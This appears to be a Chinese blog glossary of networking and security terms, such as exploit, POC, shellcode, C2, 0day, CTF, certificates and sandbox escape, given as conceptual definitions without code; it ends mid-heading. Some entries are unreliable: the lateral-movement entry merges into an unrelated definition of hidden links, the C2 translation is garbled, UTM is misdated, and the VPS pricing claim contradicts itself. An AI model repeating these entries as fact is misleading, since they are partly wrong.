title="LAN（LAN）"></a>LAN（LAN）</h2><p>局域网，网络种类，覆盖范围一般是方圆几千米之内，其具备的安装便捷、成本节约、扩展方便等特点使其在各类办公室内运用广泛。</p><p>局域网可以实现文件管理、应用软件共享、打印机共享等功能，在使用过程当中，通过维护局域网网络安全，能够有效地保护资料安全，保证局域网网络能够正常稳定的运行。</p><p>简单来说：局域网就是一种网络，连接近距离的计算机，一般位于单个房间、建筑物或小的地理区域里。LAN上的所有系统位于一个网络跳之间</p><h2 id="MAN（MAN）"><a href="#MAN（MAN）" class="headerlink" title="MAN（MAN）"></a>MAN（MAN）</h2><p>全称Metropolitan Area Network，即城域网。</p><p>是在一个城市范围内所建立的计算机通信网，属宽带局域网。</p><p>由于采用具有有源交换元件的局域网技术，网中传输延时较小，它的传输媒介主要采用光缆，传输速率在100兆比特/秒以上。</p><p>MAN的一个重要用途是用作骨干网，通过它将位于同一城市内不同地点的主机、数据库，以及LAN等互相联接起来，这与WAN的作用有相似之处，但两者在实现方法与性能上有很大差别。</p><p>基于一种大型的LAN，通常使用与LAN相似的技术。</p><p>MAN单独的列出的一个主要原因是已经有了一个标准：分布式队列双总线DQDB（Distributed Queue Dual Bus），即IEEE802.6。</p><p>DQDB是由双总线构成，所有的计算机都连结在上面。</p><h2 id="WAN（WAN）"><a href="#WAN（WAN）" class="headerlink" title="WAN（WAN）"></a>WAN（WAN）</h2><p>广域网（英语：Wide Area Network，缩写为 WAN），又称外网、公网。和我们前面讲的公网、外网是一个概念。</p><p>是连接不同地区局域网或城域网计算机通信的远程网。</p><p>通常跨接很大的物理范围，所覆盖的范围从几十公里到几千公里，它能连接多个地区、城市和国家，或横跨几个洲并能提供远距离通信，形成国际性的远程网络。广域网并不等同于互联网。</p><h2 id="EXP（EXPloit）"><a href="#EXP（EXPloit）" class="headerlink" title="EXP（EXPloit）"></a>EXP（EXPloit）</h2><p>Exploit 的英文意思就是利用，它在黑客眼里就是漏洞利用。</p><p>有漏洞不一定就有Exploit（利用)，有Exploit就肯定有漏洞。</p><p>我们几乎每隔几天就能听到最近有一个新发现的可以被利用(exploit)的漏洞(vulnerability)，然后给这个漏洞打上补丁。</p><p>而事实上，这里面的内容比你想象的要多，因为你不可能知道所有软件的漏洞，而且那些可利用的漏洞也只是被少数人所了解。</p><p>简单来说：就是漏洞利用代码，运行之后对目标进行攻击。</p><h2 id="POC（Proof-of-Concept）"><a href="#POC（Proof-of-Concept）" class="headerlink" title="POC（Proof of Concept）"></a>POC（Proof of Concept）</h2><p>概念证明，即概念验证（英语：Proof of concept，简称POC）是对某些想法的一个较短而不完整的实现，以证明其可行性，示范其原理，其目的是为了验证一些概念或理论。</p><p>概念验证通常被认为是一个有里程碑意义的实现的原型 。</p><p>在计算机安全术语中，概念验证经常被用来作为0day、exploit的别名。</p><p>简单来说：漏洞验证代码，检测目标是否存在对应漏洞。</p><h2 id="payload（payload）"><a href="#payload（payload）" class="headerlink" title="payload（payload）"></a>payload（payload）</h2><p>病毒通常会做一些有害的或者恶性的动作。</p><p>在病毒代码中实现这个功能的部分叫做”有效负载”（payload）。</p><p>payload可以实现任何运行在受害者环境中的程序所能做的事情，并且能够执行动作包括破坏文件删除文件，向病毒的作者或者任意的接收者发送敏感信息，以及提供通向被感染计算机的后门。</p><p>简单来说：就是指成功exploit之后，真正在目标系统执行的代码或指令。</p><h2 id="shellcode（shellcode）"><a href="#shellcode（shellcode）" class="headerlink" title="shellcode（shellcode）"></a>shellcode（shellcode）</h2><p>shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。</p><p>shellcode常常使用机器语言编写。</p><p>可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode机器码，让电脑可以执行攻击者的任意指令。</p><p>Shellcode：简单翻译’shell代码’，是Payload的一种，由于其建立正向/反向shell而得名。</p><h2 id="HTML（HTML）"><a href="#HTML（HTML）" class="headerlink" title="HTML（HTML）"></a>HTML（HTML）</h2><p>HTML（HyperTextMarkup Language）的全称为超文本标记语言，是一种标记语言。</p><p>它包括一系列标签，通过这些标签可以将网络上的文档格式统一，使分散的internet资源连接为一个逻辑整体。</p><p>HTML文本是由HTML命令组成的描述性文本，HTML命令可以说明文字，图形、动画、声音、表格、连接等。</p><p>超文本是一种组织信息的方式，它通过超级链接方法将文本中的文字、图表与其他信息媒体相关联。</p><p>这些相互关联的信息媒体可能在同一文本中，也可能是其他文件，或是地理位置相距遥远的某台计算机上的文件。</p><p>这种组织信息方式将分布在不同位置的信息资源用随机方式进行连接，为人们查找，检索信息提供方便。</p><p>简单来说：HTML是一种用于创建网页的标准标记语言，您可以使用HTML 来建立自己的WEB 站点，HTML运行在浏览器上，由浏览器来解析。</p><h2 id="CSS（CSS）"><a href="#CSS（CSS）" class="headerlink" title="CSS（CSS）"></a>CSS（CSS）</h2><p>层叠样式表(英文全称：CascadingStyleSheets)是一种用来表现HTML（标准通用标记语言的一个应用）或XML（标准通用标记语言的一个子集）等文件样式的计算机语言。CSS不仅可以静态地修饰网页，还可以配合各种脚本语言动态地对网页各元素进行格式化。</p><p>CSS 能够对网页中元素位置的排版进行像素级精确控制，支持几乎所有的字体字号样式，拥有对网页对象和模型样式编辑的能力。</p><h2 id="Javascript（Javascript）"><a href="#Javascript（Javascript）" class="headerlink" title="Javascript（Javascript）"></a>Javascript（Javascript）</h2><p>JavaScript（简称“JS”） 是一种具有函数优先的轻量级，解释型或即时编译型的编程语言。</p><p>虽然它是作为开发web页面的脚本语言而出名，但是它也被用到了很多非浏览器环境中，JavaScript 基于原型编程、多范式的动态脚本语言，并且支持面向对象、命令式、声明式、函数时式编程范式。</p><p>JavaScript是一种属于网络的高级脚本语言,已经被广泛用于Web应用开发,常用来为网页添加各式各样的动态功能，为用户提供更流畅美观的浏览效果。</p><p>通常JavaScript脚本是通过嵌入在HTML中来实现自身的功能的。</p><h2 id="CMS（内容管理系统）"><a href="#CMS（内容管理系统）" class="headerlink" title="CMS（内容管理系统）"></a>CMS（内容管理系统）</h2><p>内容管理系统（content management system，CMS），是一种位于WEB前端（Web 服务器）和后端办公系统或流程（内容创作、编辑）之间的软件系统。</p><p>内容的创作人员、编辑人员、发布人员使用内容管理系统来提交、修改、审批、发布内容。</p><p>这里指的”内容”可能包括文件、表格、图片、数据库中的数据甚至视频等一切你想要发布到Internet、internet以及exteanet网站的信息。</p><p>内容管理还可选地提供内容抓取工具，将第三方信息来源，比如将文本文件、HTML网页、Web服务、关系数据库等的内容自动抓取，并经分析处理后放到自身的内容库中。</p><p>随着个性化的发展，内容管理还辅助WEB前端将内容以个性化的方式提供给内容使用者，即提供个性化的门户框架，以基于WEB技术将内容更好地推送到用户的浏览器端。</p><p>内容管理系统是企业信息化建设和电子政务的新宠，也是一个相对较新的市场。对于内容管理，业界还没有一个统一的定义，不同的机构有不同的理解。</p><h2 id="VPS（VPS）"><a href="#VPS（VPS）" class="headerlink" title="VPS（VPS）"></a>VPS（VPS）</h2><p>VPS（Virtual Private Server 虚拟专用服务器）技术，将一台服务器分割成多个虚拟专享服务器的优质服务。实现VPS的技术分为容器技术，和虚拟化技术。在容器或虚拟机中，每个VPS都可选配独立公网IP地址、独立操作系统、实现不同VPS间磁盘空间、内存、CPU资源、进程和系统配置的隔离，为用户和应用程序模拟出“独占”使用计算资源的体验。VPS可以像独立服务器一样，重装操作系统，安装程序，单独重启服务器。VPS为使用者提供了管理配置的自由，可用于企业虚拟化，也可以用于IDC资源租用。</p><p>IDC资源租用，由VPS提供商提供。不同VPS提供商所使用的硬件VPS软件的差异，及销售策略的不同，VPS的使用体验也有较大差异。尤其是VPS提供商超卖，导致实体服务器超负荷时，VPS性能将受到极大影响。相对来说，容器技术比虚拟机技术硬件使用效率更高，更易于超卖，所以一般来说容器VPS的价格都高于虚拟机VPS的价格。</p><p>这些VPS主机以最大化的效率共享硬件、软件许可证以及管理资源。每个VPS主机都可选配独立公网IP地址、独立操作系统、独立超大空间、独立内存、独立CPU资源、独立执行程序和独立系统配置等。VPS主机用户除了可以分配多个虚拟主机及无限企业邮箱外， 更具有独立主机功能, 可自行安装程序，单独重启或重装主机（部分虚拟化/容器技术不支持更换内核）。</p><p>简单来说：VPS就是通过虚拟化技术隔离出来的系统。VPS主机是一项服务器虚拟化和自动化技术，它采用的是操作系统虚拟化技术。</p><h2 id="源损耗（损耗）"><a href="#源损耗（损耗）" class="headerlink" title="源损耗（损耗）"></a>源损耗（损耗）</h2><p>损耗，一般指损失，受损失或耗费的意思。这里指的是VPS的损耗。</p><p>VPS操作系统虚拟化的概念是基于共用操作系统内核，这样虚拟服务器就无需额外的虚拟化内核的过程，因而虚拟过程资源损耗就更低，从而可以在一台物理服务器上实现更多的虚拟化服务器。</p><h2 id="域名（域名）"><a href="#域名（域名）" class="headerlink" title="域名（域名）"></a>域名（域名）</h2><p>域名（英语：DomainName），又称网域，是由一串用点分隔的名字组成的Internet上某一台计算机或计算机组的名称，用于在数据传输时对计算机的定位标识（有时也指地理位置）。</p><p>由于IP地址具有不方便记忆并且不能显示地址组织的名称和性质等缺点，人们设计出了域名，并通过网域名称系统（DNS，Domain Name System）来将域名和IP地址相互映射，使人更方便地访问互联网，而不用去记住能够被机器直接读取的IP地址数串。</p><h2 id="url（统一资源定位符）"><a href="#url（统一资源定位符）" class="headerlink" title="url（统一资源定位符）"></a>url（统一资源定位符）</h2><p>URL全称：uniform resource locator，即统一资源定位系统。</p><p>url是以太网的万维网服务程序上用于指定信息位置的表示方法。</p><p>它最初是由蒂姆·伯纳斯·里发明用来作为万维网的地址。现在它已经被万维网联盟编制为互联网标准RFC1738。</p><h2 id="URI（统一资源标识符）"><a href="#URI（统一资源标识符）" class="headerlink" title="URI（统一资源标识符）"></a>URI（统一资源标识符）</h2><p>URI全称：Uniform Resource Identifier，即统一资源标识符。</p><p>是一个用于标识某一互联网资源名称的字符串。</p><p>该种标识允许用户对任何（包括本地和互联网）的资源通过特定的协议进行交互操作。URI由包括确定语法和相关协议的方案所定义。</p><p>Web上可用的每种资源，如HTML、文档、图像、视频片段、程序等，由一个通用资源标识符（Uniform Resource Identifier, 简称”URI”）进行定位。</p><h2 id="URN（统一资源名称）"><a href="#URN（统一资源名称）" class="headerlink" title="URN（统一资源名称）"></a>URN（统一资源名称）</h2><p>URN全称：Uniform Resource Name，即统一资源名称，是带有名字的因特网资源。</p><p>URN是统一资源标识（URI）的历史名字，它使用urn：作为URI scheme。</p><h2 id="curl（curl）"><a href="#curl（curl）" class="headerlink" title="curl（curl）"></a>curl（curl）</h2><p>cURL是一个利用URL语法在命令行下工作的文件传输工具，1997年首次发行。它支持文件上传和下载，所以是综合传输工具，但按传统，习惯称cURL为下载工具。cURL还包含了用于程序开发的libcurl。</p><p>cURL支持的通信协议：FTP、FTPS、HTTP、HTTPS、TFTP、SFTP、Gopher、SCP、tenlent、DICT、FILE、LDAP、LDAPS、IMAP、POP3、SMTP和RTSP。</p><p>curl还支持SSL认证、HTTP POST、HTTP PUT、FTP上传，HTTP form based upload、proxies、HTTP/2、cookies、用户名+密码认证(Basic，Plain，Digest，CRAM-MD5，NTLM，Negotiate and Kerberos)、file transfer resume、proxy tunneling。</p><h2 id="CTF（CTF）"><a href="#CTF（CTF）" class="headerlink" title="CTF（CTF）"></a>CTF（CTF）</h2><p>CTF（CaptureThe Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。</p><p>CTF起源于1996年DEFCON全球黑客大会，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。</p><p>已经成为全球范围网络安全圈流行的竞赛形式，2013年全球举办了超过五十场国际性CTF赛事。</p><p>而DEFCON作为CTF赛制的发源地，DEFCON CTF也成为了全球最高技术水平和影响力的CTF竞赛，类似于CTF赛场中的”世界杯”。</p><p>CTF竞赛模式具体分为以下三类：</p><ol><li><p>解题模式（Jeopardy）</p></li><li><p>攻防模式（Attack-Defense）</p></li><li><p>混合模式（Mix）</p></li><li><p>AWD（AWD）<br>AWD(AttackWithDefense，攻防兼备)，CTF的模式之一。</p></li></ol><p>在攻防模式CTF赛制中，参赛队伍在网络空间互相进行攻击和防守，挖掘网络服务漏洞并攻击对手服务来得分，修补自身服务漏洞进行防御来避免丢分。</p><p>攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。</p><p>在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续48小时及以上），同时也比团队之间的分工配合与合作。</p><p>这个模式是一个非常有意思的模式，你需要在一场比赛里要扮演攻击方和防守方，攻者得分，失守者会被扣分。</p><p>也就是说，攻击别人的靶机可以获取Flag分数时，别人会被扣分，同时你也要保护自己的主机不被别人得分，以防扣分。</p><h2 id="CVE（CVE）"><a href="#CVE（CVE）" class="headerlink" title="CVE（CVE）"></a>CVE（CVE）</h2><p>CVE 全称：Common Vulnerabilities &amp; Exposures，即通用漏洞披露。</p><p>CVE就好像是一个字典表，为广泛认同的信息安全漏洞或者已经暴露出来的弱点给出一个公共的名称。</p><p>使用一个共同的名字，可以帮助用户在各自独立的各种漏洞数据库中和漏洞评估工具中共享数据，虽然这些工具很难整合在一起。</p><p>这样就使得CVE成为了安全信息共享的”关键字”。</p><p>如果在一个漏洞报告中指明的一个漏洞，如果有CVE名称，你就可以快速地在任何其它CVE兼容的数据库中找到相应修补的信息，解决安全问题。</p><h2 id="SRC（SRC）"><a href="#SRC（SRC）" class="headerlink" title="SRC（SRC）"></a>SRC（SRC）</h2><p>全称：Security Emergency Response Center，即安全应急响应的中心</p><p>主要针对科技互联网企业常见的安全漏洞而特别设立的机构。</p><h2 id="CNVD（国家信息安全漏洞共享平台）"><a href="#CNVD（国家信息安全漏洞共享平台）" class="headerlink" title="CNVD（国家信息安全漏洞共享平台）"></a>CNVD（国家信息安全漏洞共享平台）</h2><p>CNVD全称：China National Vulnerability Database，即国家信息安全漏洞共享平台。</p><p>是由国家计算机网络应急技术处理协调中心（中文简称国家互联应急中心，简称CNCERT）联合国内重要信息系统单位、基础电信运营商、网络安全厂商、软件厂商和互联网企业建立的信息安全漏洞信息共享知识库。</p><p>建立CNVD的主要目标即与国家政府部门、重要信息系统用户、运营商、主要安全厂商、软件厂商、科研机构、公共互联网用户等共同建立软件安全漏洞统一收集验证、预警发布及应急处置体系，切实提升我国在安全漏洞方面的整体研究水平和及时预防能力，进而提高我国信息系统及国产软件的安全性，带动国内相关安全产品的发展。</p><h2 id="0day（0day）"><a href="#0day（0day）" class="headerlink" title="0day（0day）"></a>0day（0day）</h2><p>0day在网络安全界通常是指没有补丁的漏洞利用程序，提供该利用程序的人通常是该漏洞的首发者或是第一个公开该漏洞利用细节的人。</p><p>网络安全意思上的0day就是指一些没有公布补丁的漏洞，或者是还没有被漏洞发现者公布出来的漏洞利用工具，由于这种漏洞的利用程序对网络安全都具有巨大威胁，因此0day也成为黑客的最爱。一般的黑客软件带有Oday的名字指的是此漏洞还没有打补丁而软件已经公布。</p><p>目前国内0day的地下交易已经比较成熟，对0day有需求的包括大型的网络安全公司比如iDefence，职业黑客。</p><p>提供0day的一般都是漏洞研究爱好者或是比较松散的网络安全组织,可以参考国外的0day研究网站。某些外国网站的发布的作品可能就是中国人做的呢！！</p><h2 id="1day（1day）"><a href="#1day（1day）" class="headerlink" title="1day（1day）"></a>1day（1day）</h2><p>1day就是刚公布后的漏洞，或者公布后没有poc exp的漏洞。或者指刚公布一天的漏洞，大部分通杀。</p><p>已被发现官方刚发布补丁网络上还大量存在的Vulnerability。</p><h2 id="Nday（Nday）"><a href="#Nday（Nday）" class="headerlink" title="Nday（Nday）"></a>Nday（Nday）</h2><p>Nday就是公布很久，流传很广的漏洞，少数不更新的才能用。相对来说，通杀性不高。</p><h2 id="C2（C2）"><a href="#C2（C2）" class="headerlink" title="C2（C2）"></a>C2（C2）</h2><p>As the name itself suggests, command-and-control (C&amp;C) servers are used to remotely send often malicious commands to a botnet, or a compromised network of computers. The term originated from the military concept of a commanding officer directing control to his/her forces to accomplish a goal. C&amp;C servers were popular for using<br>internet relay chat (IRC) networks, legitimate websites, and dynamic DNS services. The backdoor malware, BKDR_ MAKADOCS .JG, is noted for its evasion technique against anti-malware as it uses Google Docs for its C&amp;C communication.</p><p>顾名思义，命令与控制（C&amp;C）服务器被用来向僵尸网络或受损的计算机网络远程发送恶意命令。该术语源自军事概念，即指挥官将控制权交给他/她的部队以实现目标。C&amp;amp；C（控制）服务器很受欢迎internet中继聊天（IRC）网络、合法网站和动态DNS服务。后门恶意软件，BKDR_uuMakadocs.JG以其规避反恶意软件的技术而闻名。</p><p>C2全称为Command and Control，即命令与控制，常见于APT攻击场景中。</p><p>作动词解释时理解为恶意软件与攻击者进行交互，作名词解释时理解为攻击者的“基础设施”</p><h2 id="横移（横移）"><a href="#横移（横移）" class="headerlink" title="横移（横移）"></a>横移（横移）</h2><p>指攻击者入侵后，从立足点在内部网络进行拓展，搜寻控制更多的系统暗链看不见的网站链接，”暗链”在网站中的链接做得非常隐蔽，短时间内不易被搜索引擎察觉，它和友情链接有相似之处，可以有效地提高网站权重。</p><h2 id="暴库（暴库）"><a href="#暴库（暴库）" class="headerlink" title="暴库（暴库）"></a>暴库（暴库）</h2><p>就是通过一些技术手段或者程序漏洞得到数据库的地址，并将数据非法下载到本地。</p><p>黑客非常乐意于这种工作，为什么呢？</p><p>因为黑客在得到网站数据库后，就能得到网站管理账号，对网站进行破坏与管理，黑客也能通过数据库得到网站用户的隐私信息，甚至得到服务器的最高权限。</p><p>简单来说：就是入侵网站的一种手法，通过恶意代码让网站爆出其一些敏感数据来，通常都用于SQL注入。</p><h2 id="CA证书（CA证书）"><a href="#CA证书（CA证书）" class="headerlink" title="CA证书（CA证书）"></a>CA证书（CA证书）</h2><p>CA是证书的签发机构，它是公钥基础设施（Public Key Infrastructure，PKI）的核心。</p><p>CA是负责签发证书、认证证书、管理已颁发证书的机关。CA 拥有一个证书（内含公钥和私钥）。</p><p>网上的公众用户通过验证 CA 的签字从而信任 CA ，任何人都可以得到 CA 的证书（含公钥），用以验证它所签发的证书。</p><p>如果用户想得到一份属于自己的证书，他应先向 CA 提出申请。</p><p>在 CA 判明申请者的身份后，便为他分配一个公钥，并且 CA 将该公钥与申请者的身份信息绑在一起，并为之签字后，便形成证书发给申请者。</p><p>如果一个用户想鉴别另一个证书的真伪，他就用 CA 的公钥对那个证书上的签字进行验证，一旦验证通过，该证书就被认为是有效的。证书实际是由证书签证机关（CA）签发的对用户的公钥的认证。</p><p>证书的内容包括：电子签证机关的信息、公钥用户信息、公钥、权威机构的签字和有效期等等。证书的格式和验证方法普遍遵循 X.509 国际标准。</p><p>简单来说：为实现双方安全通信提供了电子认证，在因特网、公司内部网或外部网中，使用数字证书实现身份识别和电子信息加密，数字证书中含有密钥对（公钥和私钥）所有者的识别信息，通过验证识别信息的真伪实现对证书持有者身份的认证。</p><h2 id="数字证书（数字证书）"><a href="#数字证书（数字证书）" class="headerlink" title="数字证书（数字证书）"></a>数字证书（数字证书）</h2><p>数字证书是指在互联网通讯中标志通讯各方身份信息的一个数字认证，人们可以在网上用它来识别对方的身份。</p><p>因此数字证书又称为数字标识。数字证书对网络用户在计算机网络交流中的信息和数据等以加密或解密的形式保证了信息和数据的完整性和安全性。</p><h2 id="SSL证书（SSL证书）"><a href="#SSL证书（SSL证书）" class="headerlink" title="SSL证书（SSL证书）"></a>SSL证书（SSL证书）</h2><p>SSL证书是数字证书的一种，类似于驾驶证、护照和营业执照的电子副本。因为配置在服务器上，也称为SSL服务器证书。</p><p>SSL 证书就是遵守 SSL协议，由受信任的数字证书颁发机构CA，在验证服务器身份后颁发，具有服务器身份验证和数据传输加密功能。</p><h2 id="数字签名（数字签名）"><a href="#数字签名（数字签名）" class="headerlink" title="数字签名（数字签名）"></a>数字签名（数字签名）</h2><p>数字签名（又称公钥数字签名）是只有信息的发送者才能产生的别人无法伪造的一段数字串，这段数字串同时也是对信息的发送者发送信息真实性的一个有效证明。</p><p>它是一种类似写在纸上的普通的物理签名，但是在使用了公钥领域的技术来实现的，用于鉴别数字信息的方法。</p><p>一套数字签名通常定义两种互补的运算，一个用于签名，另一个用于验证。数字签名是非对称密钥加密技术与摘要算法技术的应用。</p><h2 id="漏扫（漏洞扫描）"><a href="#漏扫（漏洞扫描）" class="headerlink" title="漏扫（漏洞扫描）"></a>漏扫（漏洞扫描）</h2><p>即漏洞扫描，指基于漏洞数据库，通过扫描等手段对指定的远程或者本地计算机系统的安全脆弱性进行检测，发现可利用漏洞的一种安全检测（渗透攻击）行为。</p><p>漏洞扫描器包括网络漏扫、主机漏扫、数据库漏扫等不同种类。</p><h2 id="UTM（UTM）"><a href="#UTM（UTM）" class="headerlink" title="UTM（UTM）"></a>UTM（UTM）</h2><p>UTM全称：UnifiedThreatManagement，中文名为统一威胁管理，最早由IDC于2014年提出，即将不同设备的安全能力（最早包括入侵检测、防火墙和反病毒技术），集中在同一网关上，实现统一管理和运维。</p><h2 id="网闸（网闸）"><a href="#网闸（网闸）" class="headerlink" title="网闸（网闸）"></a>网闸（网闸）</h2><p>网闸是使用带有多种控制功能的固态开关读写介质，连接两个独立主机系统的信息安全设备。</p><p>由于两个独立的主机系统通过网闸进行隔离，使系统间不存在通信的物理连接、逻辑连接及信息传输协议，不存在依据协议进行的信息交换，而只有以数据文件形式进行的无协议摆渡。</p><p>因此，网闸从物理上隔离、阻断了对内网具有潜在攻击可能的一切网络连接，使外部攻击者无法直接入侵、攻击或破坏内网，保障了内部主机的安全。</p><h2 id="数据库审计（数据库审计）"><a href="#数据库审计（数据库审计）" class="headerlink" title="数据库审计（数据库审计）"></a>数据库审计（数据库审计）</h2><p>能够实时记录网络上的数据库活动，对数据库操作进行细粒度审计的合规性管理，对数据库遭受到的风险行为进行告警，对攻击行为进行阻断，它通过对用户访问数据库行为的记录、分析和汇报，用来帮助用户事后生成合规报告、事故追根溯源，同时加强内外部数据库网络行为记录，提高数据资产安全。</p><p>数据库审计是数据库安全技术之一，数据库安全技术主要包括：数据库漏洞扫描、数据库加密、数据库防火墙、数据脱敏、数据库安全审计系统。</p><p>黑客的SQL注入攻击行为，可以通过数据库审计发现。</p><h2 id="DLP（数据防泄漏）"><a href="#DLP（数据防泄漏）" class="headerlink" title="DLP（数据防泄漏）"></a>DLP（数据防泄漏）</h2><p>当前我国涉及部门(军队、军工、政府、金融行业、保险行业、电信行业等)中，80%以上应用系统使用国外数据库产品，特别是Oracle；如何保证系统在高性能、高可用的同时提升数据的安全性，确保关键信息不被泄露、国家利益不受损失已经迫在眉睫。</p><p>数据防泄漏可以通过数据库加密实现核心数据加密存储，可以通过数据库防火墙实现批量数据泄漏的网络拦截，也可以通过数据脱敏实现外发敏感数据的匿名化，这些数据库安全技术可以实现数据防泄漏问题。</p><p>简单来说：DLP就是数据防泄漏，通过数字资产的精准识别和策略制定，主要用于防止企业的指定数据或信息资产以违反安全策略规定的形式流出企业。</p><h2 id="SD-WAN（SD-WAN）"><a href="#SD-WAN（SD-WAN）" class="headerlink" title="SD-WAN（SD-WAN）"></a>SD-WAN（SD-WAN）</h2><p>SD-WAN全称Software Defined Wide Area Network，即软件定义广域网，是将SDN技术应用到广域网场景中所形成的一种服务，这种服务用于连接广阔地理范围的企业网络、数据中心、互联网应用及云服务。</p><p>这种服务的典型特征是将网络控制能力通过软件方式‘云化’，支持应用可感知的网络能力开放。</p><h2 id="SOC（SOC）"><a href="#SOC（SOC）" class="headerlink" title="SOC（SOC）"></a>SOC（SOC）</h2><p>SOC全称：Security Operations Center，翻译为安全运行中心或者安全管理平台，通过建立一套实时的资产风险模型，协助管理员进行事件分析、风险分析、预警管理和应急响应处理的集中安全管理系统</p><h2 id="SIEM（2SIEM）"><a href="#SIEM（2SIEM）" class="headerlink" title="SIEM（2SIEM）"></a>SIEM（2SIEM）</h2><p>SIEM全称：security information and event management，即安全信息和事件管理。</p><p>负责从大量企业安全控件、主机操作系统、企业应用和企业使用的其他软件收集安全日志数据，并进行分析和报告。</p><h2 id="MIME（MIME）"><a href="#MIME（MIME）" class="headerlink" title="MIME（MIME）"></a>MIME（MIME）</h2><p>MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。</p><p>是设定某种拓展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。</p><p>多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。</p><h2 id="沙箱（沙箱）"><a href="#沙箱（沙箱）" class="headerlink" title="沙箱（沙箱）"></a>沙箱（沙箱）</h2><p>沙箱是一种按照安全策略限制程序行为的执行环境。早期主要用于测试可疑软件等，比如黑客们为了试用某种病毒或者不安全产品，往往可以将它们在沙箱环境中运行。</p><p>经典的沙箱系统的实现途径一般是通过拦截系统调用，监视程序行为，然后依据用户定义的策略来控制和限制程序对计算机资源的使用，比如改写注册表，读写磁盘等。</p><p>简单来说：沙箱是一种用于安全的运行程序的机制。它常常用来执行那些非可信的程序，非可信程序中的恶意代码对系统的影响将会被限制在沙箱内而不会影响到系统的其它部分。</p><h2 id="沙箱逃逸（沙箱逃逸技术）"><a href="#沙箱逃逸（沙箱逃逸技术）" class="headerlink" title="沙箱逃逸（沙箱逃逸技术）"></a>沙箱逃逸（沙箱逃逸技术）</h2><p>一种识别沙箱环境，并利用静默、欺骗等技术，绕过沙箱检测的现象</p><h2 id="网络靶场（网络靶场）"><a href="#网络靶场（网络靶场）" class="headerlink" title="网络靶场（网络靶场）"></a>网络靶场（网络靶场）</h2><p>网络靶场（Cyber Range）是一种基于虚拟化技术，对真实网络空间中的网络架构、系统设备、业务流程的运行状态及运行环境进行模拟和复现的技术或产品，以更有效地实现与网络安全相关的学习、研究、检验、竞赛、演习等行为，从而提高人员及机构的网络安全对抗水平。</p><p>网络靶场包含了在线网络攻防学习环境、网络安全赛事平台、网络安全技术测评研究平台，城市级甚至国家级的网络攻防演练平台等，都可以归属于网络靶场的概念。然而，在这些可以被称为网络靶场的产品中，也存在很大的差异：支持规模的量级差异、模拟环境的复杂程度、各行业应用场景的不同、网络靶场对现实的复现程度（即仿真程度）等等。</p><p>网络靶场作为支撑网络空间安全技术验证、网络武器装备试验、攻防对抗演练和网络风险评估的重要基础设施，成为新兴网络安全战略、专业人才队伍建设的重要支撑手段。</p><p>简单来说：是指通过虚拟环境与真实设备相结合，模拟仿真出真实赛博网络空间攻防作战环境，能够支撑攻防演练、安全教育、网络空间作战能力研究和网络武器装备验证试验平台。</p><h2 id="黑名单（黑名单）"><a href="#黑名单（黑名单）" class="headerlink" title="黑名单（黑名单）"></a>黑名单（黑名单）</h2><p>在网络SEO优化当中，搜索引擎或者义务用户收集的搜索引擎垃圾制造者列表，可以用于从搜索引擎封杀这些垃圾制造者，或者抵制他们。</p><p>简单来说：黑名单即不好的名单，凡是在黑名单上的软件、IP地址等，都被认为是非法的。</p><h2 id="白名单（白名单）"><a href="#白名单（白名单）" class="headerlink" title="白名单（白名单）"></a>白名单（白名单）</h2><p>白名单的概念与”黑名单”相对应。</p><p>例如：在电脑系统里，有很多软件都应用到了黑白名单规则，操作系统、防火墙、杀毒软件、邮件系统、应用软件等，凡是涉及到控制方面几乎都应用了黑白名单规则。</p><p>简单来说：与黑名单对应，白名单即”好人”的名单，凡是在白名单上的软件、IP等，都被认为是合法的，可以在计算机上运行.</p><h2 id="南北向流量"><a href="#南北向流量" class="headerlink" title="南北向流量"></a>南北向流量</h2><p>通常指数据中心内外部通信所产生的的流量。</p><h2 id="东西向流量"><a href="#东西向流量" class="headerlink" title="东西向流量"></a>东西向流量</h2><p>通常指数据中心内部不同主机之间互相通信所产生的的流量。</p><h2 id="大数据安全分析（大数据分析）"><a href="#大数据安全分析（大数据分析）" class="headerlink" title="大数据安全分析（大数据分析）"></a>大数据安全分析（大数据分析）</h2><p>区别于传统被动规则匹配的防御模式，以主动收集和分析大数据的方法，找出其中可能存在的安全威胁，因此也称数据驱动安全。</p><h2 id="杀伤链"><a href="#杀伤链" class="headerlink" title="杀伤链"></a>杀伤链</h2><p>杀伤链最早来源于军事领域，用于描述进攻一方各个阶段的状态。</p><p>在网络安全领域，这一概念最早由洛克希德-马丁公司提出，英文名称为KillChain，也称作网络攻击生命周期，包括侦查追踪、武器构建、载荷投递、漏洞利用、安装植入、命令控制、目标达成等七个阶段，来识别和防止入侵。</p><h2 id="网络空间测绘（网络空间测绘）"><a href="#网络空间测绘（网络空间测绘）" class="headerlink" title="网络空间测绘（网络空间测绘）"></a>网络空间测绘（网络空间测绘）</h2><p>网络空间测绘，用搜索引擎技术来提供交互，让人们可以方便的搜索到网络空间上的设备。相对于现实中使用的地图，用各种测绘方法描述和标注地理位置，用主动或被动探测的方法，来绘制网络空间上设备的网络节点和网络连接关系图，及各设备的画像。</p><p>网络空间测绘，在国家把网络空间安全概念提升到一个重要的层次时，更显重要。因为要搞网络攻防，首先得了解网络，要了解网络空间，就需要对网络空间测绘。</p><p>简单来说：用搜索引擎技术来提供交互，让人们可以方便的搜索到网络空间上的设备</p><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><p>常见于逆向工程或者逆向分析，简单而言，一切从产品中提取原理及设计信息并应用于再造及改进的行为，都是逆向工程。</p><p>在网络安全中，更多的是调查取证、恶意软件分析等。</p><h2 id="防爬"><a href="#防爬" class="headerlink" title="防爬"></a>防爬</h2><p>意为防爬虫，主要是指防止网络爬虫从自身网站中爬取信息。网络爬虫是一种按照一定的规则，自动地抓取网络信息的程序或者脚本。</p><h2 id="安全资源池（安全资源池）"><a href="#安全资源池（安全资源池）" class="headerlink" 